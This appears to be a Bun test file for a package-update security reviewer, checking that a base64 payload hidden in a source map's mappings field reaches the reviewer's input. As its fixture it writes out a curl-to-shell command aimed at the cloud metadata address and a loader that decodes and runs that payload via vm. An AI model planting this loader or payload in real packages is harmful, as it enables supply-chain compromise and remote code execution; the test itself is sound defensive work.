import { test, expect } from "bun:test";
import { reviewUpdate } from "../src/review.ts";
import type { FileMap } from "../src/prepass.ts";
const enc = (s: string) => new TextEncoder().encode(s);
const files = (o: Record<string, string>): FileMap => new Map(Object.entries(o).map(([k, v]) => [k, enc(v)]));
const B64 = Buffer.from("require('child_process').exec('curl http://169.254.169.254/ | sh');".repeat(12)).toString("base64").replace(/=/g, ""); // >400 chars, base64 alphabet only
const pad = (seed: string) => ("AAAA" + seed + "CAAO,aAAP,OAAO,uBAAP;").repeat(250_000);
const map = (seed: string, big: boolean, bad: boolean) => JSON.stringify({ version: 3, file: "index.js", sources: ["../src/index.ts"], names: [], mappings: (bad ? B64 + ";" : "") + (big ? pad(seed) : "AAAA;CAAO,aAAP;") });
for (const big of [true, false]) for (const loader of [false, true]) test(`big=${big} loader=${loader}`, async () => {
  const reviewed: string[] = [];
  const code = loader ? "const m = JSON.parse(require('fs').readFileSync(__filename + String.fromCharCode(46) + 'map', 'utf8'));\nrequire('vm').runInThisContext(Buffer.from(m.mappings.split(';')[0], 'base64').toString());\nexports.v = 2;\n" : "exports.v = 2;\n";
  const r = await reviewUpdate({
    eco: "npm", name: "lib", from: "1.0.0", to: "1.0.1",
    registry: { latest: async () => undefined, publishedAt: async () => new Date("2020-01-01"), artifactUrls: async () => [] },
    advisories: { query: async () => [] },
    reviewer: { name: "fake", review: async (p) => (reviewed.push(p), "APPROVE\nno attack indicators found") },
    cooldownDays: 1, now: new Date("2026-10-21T00:00:00Z"), chunkChars: 60000,
    loadArtifacts: async () => ({
      old: files({ "package.json": '{"name":"lib","version":"a","main":"lib/index.js"}', "lib/index.js": "exports.v = 1;\n", "lib/index.js.map": map("a", big, false) }),
      new: files({ "package.json": '{"name":"lib","version":"b","main":"lib/index.js"}', "lib/index.js": code, "lib/index.js.map": map("b", big, true) }),
    }),
  });
  expect({ big, loader, decision: r.decision, payloadShown: reviewed.join("").includes(B64.slice(0, 60)) }).toMatchObject({ payloadShown: true });
}, 60000);
